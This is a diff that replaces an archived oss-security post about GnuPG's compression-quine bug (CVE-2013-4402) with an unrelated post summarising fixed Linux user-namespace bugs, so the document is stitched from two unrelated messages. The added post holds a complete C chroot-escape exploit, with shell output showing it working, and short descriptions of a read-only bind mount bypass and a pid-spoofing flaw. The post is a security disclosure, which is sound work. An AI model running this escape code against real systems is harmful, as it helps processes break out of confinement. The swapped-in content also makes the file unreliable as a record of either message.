@@ -1,88 +1,143 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/10/10/2
-Message-ID: <20131010013106.GA29693@openwall.com>
-Date: Thu, 10 Oct 2013 05:31:06 +0400
-From: Solar Designer <solar@...nwall.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2013-4402 GnuPG infinite recursion in the compressed packet parser
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/13/4
+Message-ID: <CALCETrX6Rcv1uMfPdG=K6THusgx-CAjHRkUpMwruBNaZGDvb8Q@mail.gmail.com>
+Date: Sat, 13 Apr 2013 10:16:26 -0700
+From: Andy Lutomirski <luto@...capital.net>
+To: "linux-kernel@...r.kernel.org" <linux-kernel@...r.kernel.org>, oss-security@...ts.openwall.com
+Subject: Summary of security bugs (now fixed) in user namespaces
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+I previously reported these bugs privatley.  I'm summarizing them for
+the historical record.  These bugs were never exploitable on a
+default-configured released kernel, but some 3.8 versions are
+vulnerable depending on configuration.
 
-As many of you know, GnuPG 1.4.15 was released a few days ago with:
+=== Bug 1: chroot bypass ===
 
-  * Fixed possible infinite recursion in the compressed packet
-    parser. [CVE-2013-4402]
+It was possible for a chrooted program to create a new user namespace
+and a new mount namespace.  It could keep an fd to the old root, which
+is outside the new root, and therefore use it to escape, like this:
 
-http://lists.gnupg.org/pipermail/gnupg-announce/2013q4/000334.html
+--- begin ---
+/* break_chroot.c by */
+/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */
 
-There's now a nice writeup by Taylor R. Campbell, who invented the
-attack on GnuPG, and it applies to more than just GnuPG:
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <err.h>
 
-http://mumble.net/~campbell/blag.txt
+#ifndef CLONE_NEWUSER
+#define CLONE_NEWUSER 0x10000000
+#endif
 
-I'll quote it below for those reading oss-security archives a while
-later, not to rely on it still being near the beginning of blag.txt.
+static void printcwd(void)
+{
+  /* This is fugly. */
+  static int lastlen = -1;
+  char buf[8192];
+  if (getcwd(buf, sizeof(buf))) {
+    if (strlen(buf) != lastlen)
+      printf("%s\n", buf);
+    lastlen = strlen(buf);
+  } else {
+    warn("getcwd");
+  }
+}
 
----
-2013-10-08 On compression in data formats
+int fn(void *unused)
+{
+  int i;
+  int fd;
 
-   If you have a large message which you want to sign and encrypt with
-   OpenPGP, you might compress it first.  Or you might compress it
-   second.  Or, if you're not thinking much about it, you might
-   `compress' it last, although if that actually reduces the size
-   there are some cryptographers who would like to have a word with
-   you.
+  fd = open("/", O_RDONLY | O_DIRECTORY);
+  if (fd == -1)
+    err(1, "open(\".\")");
+  if (unshare(CLONE_NEWUSER) != 0)
+    err(1, "unshare(CLONE_NEWUSER)");
+  if (unshare(CLONE_NEWNS) != 0)
+    err(1, "unshare(CLONE_NEWNS)");
+  if (fchdir(fd) != 0)
+    err(1, "fchdir");
+  close(fd);
 
-   In any case, the OpenPGP message format lets you do any of these,
-   because there is a type of OpenPGP packet for compressed data,
-   whose content is interpreted as another OpenPGP packet.  OpenPGP
-   agents, such as GnuPG, are expected to recursively process packets
-   they encounter in a message, decrypting ciphertext and verifying
-   signatures and decompressing compressed data, until they hit a
-   ground case, usually a literal data packet.
+  for (i = 0; i < 100; i++) {
+    printcwd();
+    if (chdir("..") != 0) {
+      warn("chdir");
+      break;
+    }
+  }
 
-   Since messages are built up by starting with a literal data packet
-   and layering encryption, signature, and compression atop it, this
-   process should always halt at a ground case, right?  Well, no.
-   Decryption and verification (or, removing a signature) always yield
-   smaller packets than you began with, so there has to be a ground
-   case for those, but decompressing usually yields a larger packet
-   than you began with.
+  fd = open(".", O_PATH | O_DIRECTORY);
+  if (fd == -1)
+    err(1, "open(\".\")");
 
-   So you might play a cruel trick on your friend by sending a very
-   small email with a compressed packet that decompresses to a
-   terabyte of zeros.  Or you could send an email with a compressed
-   packet that decompresses to...itself.
+  if (fd != 3) {
+    if (dup2(fd, 3) == -1)
+      err(1, "dup2");
+    close(fd);
+  }
+  _exit(0);
+}
 
-   How does that work?  The Lempel-Ziv compression language is
-   powerful enough to write a quine -- that is, a program that prints
-   its own source code.  Rather than repeat the story here, I'll defer
-   to Russ Cox's article on how to write these:
+int main(int argc, char **argv)
+{
+  int dummy;
 
-      Russ Cox, `Zip Files All The Way Down', 2010-03-18.
-      http://research.swtch.com/zip
+  if (argc < 2) {
+    printf("usage: break_chroot COMMAND ARGS...\n\n"
+           "You won't be entirely out of jail.  / is still the jail root.\n");
+    return 1;
+  }
 
-   In the case of OpenPGP, it was particularly easy because OpenPGP
-   supports a number of compression algorithms including an option
-   without any CRC, so one can write a program that just spits out an
-   OpenPGP compression quine without iterating over CRCs or solving a
-   horrible system of equations.
+  close(3);
 
-   The result is CVE-2013-4402, and the lesson is that systematic
-   recursive compression is no good -- not only that it's not useful,
-   but it is actively harmful.  It's especially harmful for programs
-   that process input sent unsolicited from anywhere on the internet,
-   namely mail readers.
+  if (signal(SIGCHLD, SIG_DFL) != 0)
+    err(1, "signal");
 
-   And OpenPGP isn't the only data format that supports recursive
-   compression.  PGP/MIME, which recursively interleaves MIME entities
-   and OpenPGP packets, can probably exhibit the same issue, and the
-   small bound on recursion that GnuPG now imposes while processing
-   packets will be thwarted by the interleaving.  S/MIME 3.1 supports
-   a compressed data message type, although nobody seems to have
-   implemented it.  I'm sure there are formats outside mail that can
-   also involve recursive compression.  Which ones can you find?
----
+  if (clone(fn, &dummy, CLONE_FILES | SIGCHLD, 0) == -1)
+    err(1, "clone");
 
-Alexander
+  int status;
+  if (wait(&status) == -1)
+    err(1, "wait");
+  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
+    errx(1, "child failed");
+  if (fchdir(3) != 0)
+    err(1, "fchdir");
+  close(3);
+
+  execv(argv[1], argv+1);
+  err(1, argv[1]);
+
+  return 0;
+}
+--- end ---
+
+$ ls /
+bin   dev  home  lib64       media  opt   root  sbin  sys  usr
+boot  etc  lib   lost+found  mnt    proc  run   srv   tmp  var
+$ /path/to/break_chroot /bin/sh
+(unreachable)/hostfs
+(unreachable)/
+sh-4.2$ pwd
+(unreachable)/
+sh-4.2$ ls
+bin  dev  etc  hostfs  init  lib  lib64  proc  root  run  sbin  sys  usr  var
+
+=== Bug 2: read-only bind mount bypass ===
+
+This one was straightforward: create a new userns and mount namespace,
+then remount a previously read-only bind mount as read-write.  It
+worked.
+
+=== Bug 3: SCM_CREDENTIALS pid spoofing ===
+
+This one was also straightforward: create a new userns and then spoof
+the pid.  The capability check was on the wrong namespace.
